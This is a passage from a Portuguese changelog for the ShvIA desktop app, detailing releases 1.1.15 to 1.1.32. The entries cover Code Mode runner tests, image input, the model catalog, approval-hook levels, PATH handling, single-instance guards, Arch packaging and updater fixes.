  está em dia; quem prova a sincronia é o `npm run prova:bump`, onde a mesma
  reversão derruba o build nomeando o arquivo. Está escrito lá: duas provas, cada
  uma com a sua metade.

## 1.1.32 - A tradução de evento do runner ganha 19 réguas, e o engineStatus deixa de ser braço inalcançável

- ⚠️ **A parte que mais importa:** `traduzirMensagem` foi extraída como função
  PURA e provada. Era o trecho mais perigoso do runner e o único sem régua
  nenhuma — quando a forma de um evento do SDK muda, **nenhum `case` casa, nada é
  emitido e nada falha**. A tela do Modo Code emudece e o turno "termina" sem uma
  linha: sem exceção, sem log, sem vermelho em lugar nenhum. O defeito perfeito.
- **19 réguas novas** (`npm run prova:runner`, 8+19 = 27), sobre a função **real**
  extraída do arquivo em produção. Cada uma fixa a forma exata de um evento:
  - `init` guarda o `sessionId` — perdê-lo reinicia a conversa em silêncio, com o
    modelo respondendo do zero;
  - `system` que não é `init` é silencioso — senão a chip do modelo pisca a cada
    mensagem de serviço;
  - só `text_delta` vira texto: `thinking_delta` na tela seria raciocínio
    vazando como resposta;
  - o bloco `assistant` **não repete** o texto quando já houve deltas — repetir
    duplicaria a resposta;
  - `tool_result` com content em ARRAY vira JSON, não `[object Object]`;
  - `result` **sempre** fecha com `turn_done`, **inclusive no erro** — sem ele a
    interface fica presa em "pensando" para sempre;
  - tipo desconhecido e mensagem nula são ignorados sem estourar: SDK novo manda
    tipos que este runner não conhece, e derrubar o turno por isso trocaria uma
    funcionalidade que falta por uma sessão perdida.
- **Sete reversões com controle**, cada uma acendendo só a sua régua.
- 📌 **`engineStatus` deixa de ser inalcançável.** O Rust tratava a ação desde a
  1.0.0 e o wrapper JS **nunca a expôs** — e o comentário ao lado dizia que "a
  página pergunta antes de oferecer o Modo Code". Não perguntava, e não tinha
  como. Pior: o comentário estava colado no `writeCliConfig`, então lia como se
  fosse dele. Exposto agora, com o consumidor real sendo a versão do motor à
  vista de quem for pedir suporte.
- ⚠️ **E ela NÃO é gate de capacidade** — para isso continua valendo `recursos`.
  A ação só existe em cascas que já a expõem, então usá-la como gate responderia
  sempre "sim", que é o contrário do que um gate precisa fazer.

## 1.1.31 - A ponte passa a declarar o que esta casca sabe fazer, e o piso do anna sobe para 0.11.4

- **`window.__shviaCode.recursos = { imagem: true }`** — constante local da ponte,
  sem ida ao Rust. A pergunta é "esta versão do app sabe fazer X?", e a resposta
  está na própria casca.
- ⚠️ **Por que isto existe, e por que era um furo da 1.1.30.** A página do Modo
  Code vem do **servidor** e atualiza a cada deploy; o `anna` e o `claude-runner`
  vêm **embutidos no app instalado**. Os dois andam em ritmos diferentes, então
  página nova conversando com casca velha é o estado NORMAL, não a exceção. Sem
  este flag, a página mandaria `images` no payload e uma casca anterior — que só
  lê `text` — descartaria a figura em **silêncio**: o chip na tela dizendo que
  foi, o modelo respondendo sem ter visto nada. A 1.1.30 entregou imagem no
  runner sem nada que dissesse à página se a casca a tinha; o furo estava aberto
  entre o deploy da página e a atualização do app.
- **O teste é de PRESENÇA, não de número de versão.** Ausência do flag é a
  resposta "não" — que é exatamente o que se quer de uma casca que não sabe
  responder. Comparar versão pediria à página que mantivesse a tabela de quem
  trouxe o quê.
- **`ANNA_MINIMO` sobe de `0.10.0` para `0.11.4`.** O flag é uma PROMESSA sobre os
  sidecars empacotados; empacotar um `anna` anterior faria a casca prometer o que
  o motor não cumpre. Piso baixo aqui não entrega Modo Code quebrado — entrega
  Modo Code **mentindo**, que é pior, e por isso derruba o build.
- 📌 **Medido de passagem, não consertado:** o Rust trata a ação de ponte
  `engineStatus` (`code_bridge.rs:528`) e o comentário ao lado diz que "a página
  pergunta antes de oferecer o Modo Code" — mas o **wrapper JS não a expõe** e
  nenhuma página a chama. Braço implementado e inalcançável, com um comentário
  descrevendo um consumidor que não existe.
- **Do outro lado:** `SHVIA-CODE` 0.11.4 e `SHVIA-WEB` 2.102.39.

## 1.1.30 - O runner passa a aceitar imagem no turno, em blocos do SDK, e ganha a primeira prova de 367 linhas sem nenhuma

- **O que entra:** `{"type":"user","text":"...","images":[{mime,dataBase64}]}`. O
  campo é **opcional** — sem ele o turno continua exatamente como estava. É a
  metade desktop do anexo do Modo Code (`SHVIA-WEB` 2.102.38); o cliente está
  documentado em `docs/FRONTEND/ANEXO-NO-MODO-CODE.md` daquele repo.
- **A ponte Tauri não mudou uma linha.** `fn send()` (`code_bridge.rs:704`)
  serializa o payload inteiro para o stdin, então campo novo atravessa sozinho. O
  dimensionamento inicial apontava para `code_bridge.rs:82` — que é o *comentário*
  do wrapper JS, não Rust. Medir encolheu a fatia.
- **`montarPrompt(text, images)`:** sem imagem devolve a **string** de sempre;
  com imagem, um `AsyncIterable<SDKUserMessage>` de um item. Cabe porque o runner
  já cria um `query()` **por turno** com `resume: sessionId` — não é sessão de
  streaming, é um turno que por acaso aceita iterável. Trocar todo turno de texto
  por iterável "para uniformizar" mudaria o caminho de 100% dos pedidos por causa
  de um caso que pode não acontecer.
- **Ordem dos blocos: imagem ANTES do texto.** A última coisa que o modelo lê é o
  que se está pedindo — mesma escolha do anexo de arquivo no cliente.
- **A fila deixou de guardar string.** `queue.push(String(msg.text))` perderia a
  imagem: o turno enfileirado sairia depois sem os blocos, **bem-formado e sem a
  figura** — silêncio com cara de sucesso. Guarda `{text, images}`, e a imagem
  viaja presa ao pedido que a trouxe. O mesmo defeito existia no `codeQueue` do
  cliente e foi consertado lá na mesma fatia.
- **Texto em branco não vira bloco vazio:** o SDK recusa `text: ""`, e imagem
  colada sem pedido ("olha isto") é um pedido legítimo.
- ⚠️ **A lacuna que esta versão fecha em parte:** o `claude-runner.mjs` tem 367
  linhas e **nenhuma prova** — é a metade do Modo Code que roda fora do gateway,
  com a assinatura do dono, e a única verificação era abrir o app e olhar. Nasce
  `npm run prova:runner` (`scripts/prova-montar-prompt.mjs`), no molde do
  `prova:bump`: 8 réguas sobre a função **real**, extraída do arquivo em produção.
  Conferidas por reversão — os três defeitos citados no cabeçalho dela foram
  reintroduzidos um a um, e cada um acendeu só a sua régua. O resto do arquivo
  segue sem prova; está registrado, não resolvido.

## 1.1.29 - O seletor do Modo Code passa a oferecer o Opus 5: o catálogo vinha do SDK, mas o SDK estava congelado pelo lock da instalação

- **O sintoma:** escolher **Opus** no dropdown dava Opus 4.8 (`/model` na sessão
  respondia `Current model: Opus 4.8 (1M context)`), e o Opus 5 não aparecia em
  lugar nenhum da lista — não havia como selecioná-lo sem digitar o ID inteiro.
- **O seletor não estava mentindo** (isso foi consertado na 1.1.28): ele mostra
  fielmente o `supportedModels()` do Agent SDK. Com o SDK **0.3.218** instalado,
  o catálogo tinha 5 linhas e o alias `opus[1m]` resolvia para
  `claude-opus-4-8[1m]`. Não havia Opus 5 para oferecer.
- **Onde o catálogo envelheceu: no `package-lock.json` do destino.** O
  `install.sh` copia o `package.json` (`^0.3.218`) e roda `npm install`, mas o
  lock de uma instalação anterior sobrevive em `~/.local/share/shvia-claude-runner`
  e ganha do `^` — reinstalar não atualizava nada. A 1.1.28 tirou o catálogo da
  casa para ele não envelhecer calado; a cópia que sobrou envelhecendo era o
  próprio SDK.
- **Correção:** piso em `^0.3.239` e `rm -f "$DEST/package-lock.json"` antes do
  `npm install`, para o `^` resolver de verdade a cada reinstalação. Não há build
  reproduzível a proteger aqui — o runner **não viaja no instalador** (só o `anna`
  viaja), é instalação local do dono da máquina.
- **O `install.sh` passa a imprimir a versão do Agent SDK** no fim. Ela **é** o
  catálogo: quando o seletor não oferece um modelo que já existe, é esse número
  que responde por quê. Mesmo motivo do `versao_do_anna` na 1.1.25 — diagnóstico
  escondido dentro de um `node_modules` é diagnóstico que ninguém faz.
- Catálogo depois de atualizar (medido em 21/08): `Default (recommended)` e
  `Opus (1M context)` → `claude-opus-5[1m]`; `Fable` → `claude-fable-5`;
  `Sonnet` → `claude-sonnet-5`; `Haiku` → `claude-haiku-4-5`. **Nenhuma linha de
  UI mudou** — o dropdown já lia o catálogo do motor.
- ⚠️ **Quem já tem o runner instalado precisa rodar `claude-runner/install.sh`
  de novo.** Sem isso o app segue com o SDK velho e o Opus 5 não aparece.

## 1.1.28 - Os seletores do Modo Code param de mentir no motor Claude: catálogo vem do SDK, e model/effort/aprovação chegam ao runner

- **O defeito:** com o motor **Claude Code** ativo, INFRA/MODELO/ESFORÇO seguiam
  mostrando o catálogo do **gateway** (`Kilo Gateway`, `openai/gpt-5.6-sol`) —
  nomes que não significam nada para o Claude Code. Aceitavam clique e não
  faziam efeito: a ponte lia `model`/`effort` e **descartava**. Seletor que
  parece funcionar é pior que seletor ausente, porque ninguém procura o defeito.
- **`claude-runner --modelos`** pergunta o catálogo ao próprio Agent SDK
  (`supportedModels()`) e imprime JSON. Cada linha traz `supportsEffort` e
  `supportedEffortLevels`, então a UI oferece só os níveis que aquele modelo
  aceita — e desabilita quando não aceita. Medido em 21/08: a chamada é de canal
  de controle e **não consome turno**. Perguntar ao SDK em vez de manter cópia é
  deliberado: os aliases (`opus[1m]`, `opusplan`, `best`…) mudam com o cliente.
- **`--effort` e `--aprovacao`** entraram no runner; a ponte repassa os dois.
- 🔒 **A trava que impede a correção de virar regressão:** a ponte só repassa
  `model`/`effort` quando a página manda `modelDoClaude: true`. Até agora o
  modelo era descartado, então a UI mandando um id do gateway era inofensivo;
  repassar sem conferir trocaria "seletor inerte" por "sessão que não abre".
  A garantia é declarativa — nada de adivinhar pela forma do id, que erraria no
  primeiro alias novo. Quem sabe de qual catálogo o valor saiu é quem montou o
  seletor.
- **Aprovação: os níveis continuam Manual/Edit/Auto nos dois motores**, e isso é
  decisão, não preguiça. O `permissionMode` do SDK **não estava em jogo** — quem
  decide é o hook `PreToolUse` do runner, que é o que faz o cartão de aprovação
  aparecer na tela do ShvIA. Passar o modo da Anthropic moveria a decisão para
  dentro do Claude Code, que a casca não renderiza: o usuário **perderia** a tela
  de aprovação em vez de ganhar controle. O hook agora honra os três níveis.
  `bypassPermissions` e `dontAsk` ficam de fora — não são "auto", são *sem gate*,
  e um motor não pode ser a porta dos fundos do outro ("não existe modo yolo").

## 1.1.27 - Reempacota o anna 0.11.3, e o número do sidecar passa a ser lido do artefato

- **O que muda no bundle:** o `anna` empacotado sai de **0.11.1** para **0.11.3**.
  Correção de premissa registrada: a defasagem **não** era o 0.8.4 de julho — os
  rebuilds de 19/08 (1.1.23–1.1.25) já haviam consertado aquilo. Medido em 20/08, o
  app instalado carregava 0.11.1 (`/usr/bin/anna`, mesma data do executável), então a
  distância real era **uma patch**.
- **O bloqueio que apareceu antes do build, e valeu mais que o build:** o `SHVIA-CODE`
  estava com o bump da 0.11.2 **pela metade** — `version.md` em 0.11.2 e `Cargo.toml`
  em 0.11.1 —, então `cargo build` produzia um binário respondendo **`anna 0.11.1` com
  o código da 0.11.2**. Stagear assim faria o *"Sobre → Motor do Code"* desta 1.1.25
  mostrar o número **errado**, que é pior que não mostrar. Consertado em SHVIA-CODE
  **0.11.3**, que também ganhou o `build.rs` que aquele repo não tinha.
- **O piso de versão NÃO dispararia, e está certo.** `ANNA_MINIMO = [0,10,0]`, e tanto
  0.11.1 como 0.11.3 estão acima — ele guarda contra binário **antigo**, não contra
  binário **mal etiquetado**. O caso de 20/08 não era do piso; era do bump.
- **A versão do sidecar foi conferida no BINÁRIO staged, não no log do
  `stage-anna`** — `sha256` igual ao compilado, `--version` lido do arquivo em
  `src-tauri/binaries/`. Log sem leitor foi exatamente o mecanismo que deixou o 0.8.4
  passar quatro semanas; o número tem de vir de onde ele vai rodar.

## 1.1.26 - O X pergunta antes de encerrar sessão do Code, e o app passa a ser uma instância só

- **O caso (20/08):** o X foi apertado sem querer com o Modo Code aberto, e o app
  fechou. Medido antes de mexer, e a medição **contradisse o sintoma**:
  `tray.json` diz `{"avisou":true,"close_to_tray":true}` — e não é reescrito desde
  30/jul —, então o `CloseRequested` deveria ter **recolhido** para a bandeja, não
  fechado. Ou seja: havia um defeito **antes** da confirmação.
- **A causa provável, e ela não era o diálogo que faltava:** havia **dois**
  `shvia-desktop` vivos ao mesmo tempo (um de 19/08 14:08, outro de 20/08 08:16,
  com pais diferentes) mais um zumbi desde 06/08 — e **não existia guarda de
  instância única**. Sem ela, cada invocação é um app novo, com bandeja própria e
  contagem de janelas própria, e aí o `webview_windows().len() <= 1` do
  `CloseRequested` decide **certo sobre a instância errada**: cada uma acha que é a
  única do mundo.
- **`tauri-plugin-single-instance`** entra, e **como primeiro plugin** do builder —
  é requisito dele, não estilo: ele decide se este processo continua vivo antes de
  qualquer outra inicialização. A segunda invocação agora **foca a janela da
  primeira**. `show()` antes de `unminimize()`, porque a janela pode estar recolhida
  na bandeja, e `unminimize` numa janela oculta não a torna visível.
- **A confirmação é condicional, e a condição é a decisão.** A ordem das cláusulas
  de `decidir_fechar` é o desenho: **recolher ganha de perguntar** (se nada se
  perde, confirmar é pedir aval para uma ação sem consequência — o caminho mais
  curto para ensinar alguém a clicar sem ler); **perguntar só com `anna` no ar**,
  porque aí fechar encerra a sessão **e** deixa processo órfão; **fechar calado no
  resto**, que é o que qualquer app faz.
- **Órfão não é hipótese:** havia dois `anna` vivos e um `shvia-desktop` zumbi de 14
  dias nesta máquina. Por isso, ao confirmar, o sidecar é morto **antes** de a
  janela ser destruída — depois do `destroy` o label sai do mapa e ninguém mais sabe
  qual `anna` era daquela janela.
- **`destroy()`, nunca `close()`:** `close` reemite `CloseRequested` e o guard
  perguntaria para sempre. E o diálogo roda em `std::thread::spawn` com
  `api.prevent_close()` chamado **antes** — `blocking_show` na main thread trava o
  app, que é a regra que o `updater::perguntar` já documenta nesta casa.
- **A decisão foi extraída para função pura** (`decidir_fechar`) para ser provável
  sem janela, sem bandeja e sem sidecar: **4 testes**, e a reversão foi conferida —
  invertendo a ordem das cláusulas, o primeiro reprova com
  `left: Perguntar, right: Recolher`.
- ⚠️ **Achado que fica aberto:** `desligar_recolher` é chamado quando a criação da
  bandeja **falha** e **persiste** `close_to_tray: false`. Mitigação de falha
  transitória que fica permanente — no Linux, onde bandeja falha por ambiente, isso
  desliga o item D2 para sempre sem ninguém saber. Não consertado aqui.

## 1.1.25 - O "Sobre" passa a mostrar o motor do Code, com a versão E a origem

- **O caso (19/08):** o Modo Code travava no 422 do gateway com o app na última
  versão e um `anna 0.8.4` de julho assado dentro dele. A versão do sidecar não
  aparecia em lugar nenhum — nem no app, nem na tela de erro, que mandava
  "atualize o app" enquanto o app já estava atualizado. Diagnóstico que depende
  de alguém rodar `--version` num binário escondido dentro de um bundle é
  diagnóstico que ninguém faz.
- **A linha "Motor do Code"** mostra o `anna` que ESTE app usaria, resolvido pelo
  mesmo `resolve_bin` que o Modo Code usa — então o que aparece é o que roda, não
  o que está no PATH de quem lê.
- **A origem vai junto** (`empacotado` / `externo`), e é ela que fecha o caso: o
  empacotado vence o do PATH por desenho, então instalar um `anna` novo no PATH
  não muda nada. Sem essa palavra na tela, a conclusão natural é a errada.
- **O "Copiar" carrega a mesma linha** — ele existe para colar em relato de
  suporte, e era exatamente essa a informação que faltava no relato.
- A saída do binário é **filtrada** antes de entrar na string JS do modal
  (alfanumérico, `.`, `-`, `+`, `_`, teto de 32): valor vindo de subprocesso não
  pode fechar aspa e virar código numa via de `eval`.

## 1.1.24 - O agente dentro do app volta a encontrar node, cargo e php: sidecar recebe o PATH do shell de login

- **App de GUI não herda PATH de shell.** No macOS o launchd entrega
  `/usr/bin:/bin:/usr/sbin:/sbin`, e o `anna` roda as ferramentas com `sh -c`
  herdando isso — então `npx`, `node`, `cargo`, `php` e `composer` (Homebrew,
  `~/.cargo/bin`, `~/.local/bin`) simplesmente não existiam dentro do app,
  embora funcionem no terminal.
- **O sintoma era o agente insistir, não avisar.** 19/08, projeto KIDS: 100
  voltas, 19 min, 125 ferramentas, US$ 1,24 repetindo `npx @gltf-transform/cli`
  impossível — com o `command not found` escondido atrás de `>/dev/null`. Subir
  o teto de voltas (anna 0.11.0) só deu mais corda; a causa era o ambiente.
- `src-tauri/src/user_env.rs`: PATH do `$SHELL -ilc` com marcadores contra
  banner de dotfile, watchdog de 3s, validação e união com o PATH atual (nunca
  substitui, preserva a ordem do usuário). Aplicado no `spawn` do
  `anna`/`claude-runner` e na sonda `command -v` do `resolve_bin` — que também
  não achava um `anna` instalado em `~/.local/bin`. Windows fica de fora
  (já recebe o PATH do usuário). Racional completo em ADR-030.
- Reempacota o **anna 0.11.1** (aviso do teto deixa de mostrar JSON de protocolo
  ao usuário — a string aparecia crua na timeline).

## 1.1.23 - Reempacota o anna 0.11.0: o teto de voltas do Modo Code deixa de matar turno legítimo na volta 25

- Rebuild sem mudança de código próprio: o estágio D5 empacota o `anna` do
  PATH na hora do build, e o `resolve_bin` do app prefere o binário bundlado —
  então a única forma de o Modo Code do desktop ganhar o teto novo é uma
  versão nova do app. A 1.1.22 (nunca publicada) carregava o anna 0.10.1, cujo
  teto fixo de 25 voltas matou um turno real de 26 ferramentas no projeto KIDS
  em 19/08 ("teto de voltas atingido — refine a pergunta").
- O anna 0.11.0 (SHVIA-CODE 1db563b) traz `max_voltas` configurável (env
  `SHVIA_MAX_VOLTAS` > config.toml > default 100) e, no host NDJSON, encerra o
  turno com a sessão viva — responder "continua" retoma de onde parou. No
  macOS o config.toml do anna fica em `~/Library/Application Support/shvia-code/`.

## 1.1.22 - O bump ganha prova: os seis portadores concordam, ou o build cai

- **A terceira ocorrência do bump pela metade.** `scripts/sync-version.mjs`
  sincronizava os portadores de versão a partir do `version.md` e **nunca
  falhava**: arquivo ausente e padrão de versão não encontrado eram `console.warn`
  \+ `continue`. Um portador que parasse de casar com o regex sairia da sincronia
  **para sempre**, com o build verde e ninguém sabendo.
- **O histórico que justifica:** 1.1.18→1.1.19 deixou os manifestos atrás; a
  1.1.19 existia justamente para consertar isso; e na 1.1.20 o `version.md` e o
  CHANGELOG foram na frente dos manifestos e **travaram a validação do `makepkg`**.
  Três vezes é padrão, não descuido.
- **O que muda:** o script agora **prova** o que fez — ao fim reconfere os cinco
  portadores contra o `version.md` e sai `exit 1` se algum discordar, nomeando
  quais. `npm run prova:bump` faz a mesma conferência **sem escrever**, para rodar
  antes de commitar: o build já sincronizava, e o que passava era a árvore
  **commitada**.
- **Reusa o mesmo par (regex, substituição) da sincronia** em vez de um segundo
  padrão para ler versão — segunda implementação é a que diverge calada.
- **Por que falhar e não avisar:** é a mesma regra do piso de versão do `anna`
  (1.1.21) e do `STANDING_ATIVO` nascer em `0`. Aviso em log de build é o que
  ninguém lê. Conferido por reversão nas duas classes de falha — portador em
  versão diferente e padrão que deixou de casar —, as duas saem `exit 1`.

## 1.1.21 - O empacotamento do `anna` ganha piso de versão: motor velho derruba o build em vez de virar release

- **O caso (19/08):** sessão longa do Modo Code travava no 422 do gateway
  (`messages` tem `max:200`). O `anna` 0.10.0 (18/08) compacta o histórico antes
  de enviar e resolve — mas o app saía com o `anna` que estivesse no PATH da
  máquina de build, e ali havia um **0.8.4 de julho**. Resultado: app na última
  versão, mensagem de erro mandando "atualize o app", e o app já atualizado. O
  que estava velho era o sidecar **dentro** dele.
- **O que muda:** `scripts/stage-anna.mjs` passa a exigir `ANNA_MINIMO` (0.10.0)
  e **derruba o build** abaixo disso, nomeando a versão achada e o comando de
  conserto. Ausência do `anna` continua não sendo erro — lá o Modo Code fica
  declaradamente indisponível; aqui ficaria disponível e quebrado, que é pior.
  É a mesma regra que o script já aplicava a binário que não responde
  `--version`, estendida a um caso a mais.
- **Por que não bastava o aviso:** o risco estava previsto no cabeçalho do
  próprio script desde o começo, com a mitigação *"imprime a versão para alguém
  conferir depois"*. O número estava no log do build; o log é que não tem leitor.
  Aviso perde para gesto — o mesmo argumento do `STANDING_ATIVO` nascer em `0`.

## 1.1.20 - Ícone do app entra na marca atual do ShvIA (o "S" azure) — o update parava de "trocar o ícone" porque o repo nunca trocou

- O usuário via o ícone antigo ("AI" + seta Blue3 sobre navy, design 0.3.1 de
  08/07) voltar a cada atualização e parecia bug do updater. NÃO era: o updater
  entrega exatamente o que o repo builda, e `src-tauri/icons/` + `brand/` nunca
  receberam a marca nova — o "S" azure existia só no site (favicon.svg do
  SHVIA-WEB, marca oficial de 25/07, quando o ShvIA ganhou identidade própria).
- Fonte nova `brand/shvia-desktop-icon-1024.png`: o favicon.svg oficial (bloco
  azure #34B3EC, rx≈23%, S em #0B0F17) embrulhado na grade de ícone do macOS
  (conteúdo 824×824 centrado em canvas 1024 transparente, margens 100px) e
  renderizado via qlmanage. Conjunto inteiro regenerado com `tauri icon`
  (icns/ico/png/Square*); os android/ e ios/ gerados foram descartados (mobile
  é outro repo). O tray de menu bar segue o template "AI" da 1.1.14 — decisão
  deliberada, não foi tocado.
- O ícone novo chega ao usuário na PRÓXIMA release publicada (o build embute o
  .icns). No Dock/Finder o macOS pode segurar cache de ícone da versão antiga;
  o app aberto e o alternador ⌘Tab mostram o novo imediatamente.

## 1.1.19 - O manifesto passa a mesclar por artefato, e o pacote do Arch para de sumir quando a Debian publica

O merge do `release.json` era **por plataforma**: `platforms[PLATAFORMA]` trocava
inteiro a cada build. Isso assumia "uma máquina por plataforma", e o Linux deixou de
caber nessa suposição na 1.1.16 — a máquina Arch gera o `.pkg.tar.zst` por `makepkg`
(ADR-028) e a Debian não gera nenhum. Publicar da Debian **apagava do manifesto** o
pacote pacman que a Arch tinha publicado.

É a mesma classe do bug que o download-antes-de-gerar do `--publish` já resolve entre
macOS/Windows/Linux, um nível abaixo — e pior de enxergar, porque as duas máquinas
escrevem na mesma chave `linux` e o manifesto resultante parece íntegro. O repositório
pacman em si sobrevivia (o `shvia.db` é arquivo separado); o que se perdia era a
entrada no manifesto, e com ela o `sha256` de quem baixa o pacote direto.

- **Mescla dentro da plataforma, chaveada pelo nome do arquivo.** O build atual sempre
  vence — artefato regerado substitui o hash antigo em vez de conviver com ele. Versão
  nova continua descartando o manifesto inteiro, então nada de outra release se acumula.
- **O log diz o que foi PRESERVADO de outra máquina.** Sem isso o operador veria "3
  artefatos" e um `release.json` com quatro, sem saber de onde veio o quarto — silêncio
  é o que fez este bug durar.
- **O aviso de "nenhum artefato assinado" ficou honesto.** Ele afirmava que o
  auto-update não ofereceria a versão; com a mescla isso pode ser falso, porque outra
  máquina já publicou artefato assinado da mesma release. A frase forte agora só sai
  quando o manifesto inteiro está sem assinatura.

Conferido com fixture das duas máquinas (Arch publica os 4 → Debian publica 3 → o
`.pkg` continua lá), com rehash e com troca de versão; e o comportamento antigo foi
reproduzido no script anterior para provar que o teste tem régua. Fecha a §2 das
pendências ativas do `.continue/estado-atual.md`.

## 1.1.18 - Conserta o update no Arch: o pacote convertido sai com o marcador, e o app deixa de depender só dele

O pacote pacman publicado na 1.1.17 (`shv-ia-1.1.17-1-x86_64.pkg.tar.zst`) foi
gerado por `fpm` numa máquina Debian, e portanto **sem** o marcador
`/usr/share/shvia-desktop/instalado-por`. No Arch, o app não sabia que tinha vindo
do pacman: pediu `?bundle=deb`, recebeu o `.deb`, chamou `pkexec dpkg -i` — que não
existe lá — e falhou no fim do download, exibindo um conselho sobre senha de
administrador que não tinha nada a ver com a causa. O ADR-028 previa esse cenário
por escrito e o build avisava no terminal; nada disso impediu o pacote de subir.

- **Guard novo no `updater.rs`, independente do empacotamento:** bundle se dizendo
  `deb` sem `dpkg` no sistema (ou `rpm` sem `rpm`) já é motivo para não oferecer o
  download. Ao contrário da leitura do marcador, aqui **não** há fail-open a
  preservar — não existe sistema onde essa instalação se atualize, então o download
  terminaria em erro de qualquer jeito. O marcador continua e tem precedência,
  porque ele permite a instrução exata (`sudo pacman -Syu`) em vez de um palpite.
  A busca do comando cobre o `PATH` e `/usr/sbin:/usr/bin:/sbin:/bin`, já que o
  plugin chama o instalador por `pkexec`/`sudo`, que montam PATH próprio.
- **A rota `fpm` do `build-local.sh` deixou de converter o `.deb` direto:** agora
  extrai o payload (`dpkg-deb -x`, ou `bsdtar` onde não houver), injeta o marcador e
  empacota com `-s dir`. Converter não deixava injetar arquivo nenhum — era a raiz
  do problema, não um detalhe de implementação.
- **Um nome só para o pacote: `shvia-desktop`.** O `fpm` vinha publicando `shv-ia`
  (nome herdado do pacote Debian) e o PKGBUILD, `shvia-desktop` — dois nomes para o
  mesmo app deixariam o `pacman -Syu` de quem instalou um cego para o outro, parado
  e sem erro na tela. `replaces`/`conflicts` nas duas rotas migram quem já instalou
  o `shv-ia`.
- **O `.pkg` de nome legado é removido do bundle dir antes de empacotar.** Ele tem a
  versão corrente no nome, então o `release-manifest.mjs` o aceitaria e o
  `find … | head -1` do `repo-add` poderia publicá-lo em vez do pacote novo.
- **ADR-029** conta o caso e revoga a consequência do ADR-028 que aceitava pacote sem
  marcador. `docs/build.md` perde o "conversão best-effort", e o `.continue/arch.md`
  — o molde para SSHVTERM-DESKTOP e GITHUB-DESKTOP — passa a exigir as duas camadas:
  quem copiar só o marcador herda esta falha.
- **Validado:** `cargo test` 48/48 (6 testes novos, incluindo o caso real desta versão
  e o contra-teste de que Debian/Fedora seguem atualizando), o novo conferido por
  reversão; `cargo clippy --all-targets` limpo; `bash -n`; e o bloco de empacotamento
  **executado** num sandbox com um `shv-ia-1.1.17` plantado (o `.deb` no disco ainda
  é o da 1.1.17) — saiu `shvia-desktop-1.1.17-1-x86_64.pkg.tar.zst` com o marcador dentro,
  `%REPLACES%`/`%CONFLICTS%` no `shvia.db` e o pacote legado apagado. Segue **não
  validado** o caminho `makepkg` (esta máquina é Debian 13) — pendência §1 do
  `.continue/estado-atual.md`, aberta desde a 1.1.16.

## 1.1.17 - Saneia o .continue: estado-atual descrevia a 0.8.0 com o repo na 1.1.16

- `estado-atual.md` reconstruído a partir do `git log` real. Ele listava como
  pendência coisa entregue há semanas — offline v2 (1.1.13), updater (1.0.0),
  tray (1.1.0), diagnóstico (1.1.4) e o `anna` no instalador (0.18.0) — e quem
  lesse ia refazer trabalho pronto. O que não deu para confirmar (microfone e
  Ctrl+V de imagem no WebKitGTK) ficou marcado como **não reavaliado**, não como
  pendente: afirmar que continua quebrado sem testar seria inventar status.
- Entram as duas pendências reais que a 1.1.16 criou: o caminho `makepkg` nunca
  rodou (foi escrito numa máquina Debian, sem makepkg/bsdtar/repo-add), e o
  `release-manifest.mjs` derruba a entrada do `.pkg` do manifesto quando se
  publica de uma máquina Linux que não gera pacote Arch.
- Dois links mortos consertados: `SAMIR-v1.md` (removido na 1.1.6) e a âncora
  `#decisões-em-aberto`, que no escopo é `#7-decisões-em-aberto`.
- `arch.md` encolhido para o que segue em aberto — SSHVTERM-DESKTOP e
  GITHUB-DESKTOP ainda na rota `fpm`. A parte que virou decisão estável está em
  docs/build.md e no ADR-028, que é a convenção da pasta (nota madura vira doc e
  sai daqui). Fica registrado ali que qualquer repo que ganhe pacote pacman
  herda o problema do auto-update, e sem o marcador entrega um update que falha
  no fim do download.
- `README.md` do `.continue` passa a listar o `arch.md`, que existia desde 04/08
  sem estar na tabela.

## 1.1.16 - Build nativo no Arch (makepkg + repo pacman) e o app para de tentar auto-update lá

- `build-local.sh` detecta a distro por `/etc/os-release` (`ID` + `ID_LIKE`, cobrindo
  Manjaro/EndeavourOS e Ubuntu/Mint). O preflight passa a sugerir `pacman -S` no Arch —
  antes mandava `apt-get install`, comando que não existe lá.
- Pacote Arch agora sai por `makepkg` com o novo `packaging/arch/PKGBUILD` quando o build
  roda num Arch; o `fpm` convertendo o `.deb` fica como fallback para máquina Debian.
  O PKGBUILD reempacota o `.deb` em vez de recompilar — mesmo binário, e sem levar a
  chave privada do updater para dentro do makepkg.
- `--publish` sobe também o banco do repositório (`repo-add`), então o usuário recebe
  versão nova com `pacman -Syu` em vez de baixar arquivo à mão.
- O app **não tenta mais se auto-atualizar quando foi instalado por pacman** (ADR-028):
  o `tauri-plugin-updater` não tem instalador de pacman e rodaria `pkexec dpkg -i` depois
  de baixar ~80 MB. O pacote instala `/usr/share/shvia-desktop/instalado-por` e o
  `updater.rs` lê o arquivo: havendo versão nova, avisa e manda rodar `pacman -Syu`.
- Revoga a nota da 1.1.15: o `.pkg.tar.zst` passa a entrar no `release.json` como artefato
  de download (sem `.sig`, e o endpoint ignora artefato sem assinatura — logo, inerte para
  o auto-update).
- **Não validado:** o caminho `makepkg` de ponta a ponta. A máquina onde isto foi escrito é
  Debian 13, sem `makepkg`/`bsdtar`/`repo-add` — precisa de uma passada num Arch.

## 1.1.15 - build-local.sh (Linux) ganha o pacote Arch (.pkg.tar.zst) via fpm

- O bundler do Tauri 2.x só gera deb/rpm/AppImage no Linux; o pacote pacman agora
  sai convertendo o .deb com o fpm na própria máquina Debian (sem host Arch).
  Deps mapeadas para os nomes do Arch (webkit2gtk-4.1, gtk3, libayatana-appindicator
  — o app usa tray-icon). Best-effort: sem fpm no PATH, avisa como instalar e segue.
- Fora do release.json/publish por enquanto: o fpm não gera o .sig do updater e o
  endpoint do ShvIA trata artefato sem assinatura como inexistente — entrar no
  manifesto quebraria a verificação da publicação. Distribuição manual por ora.
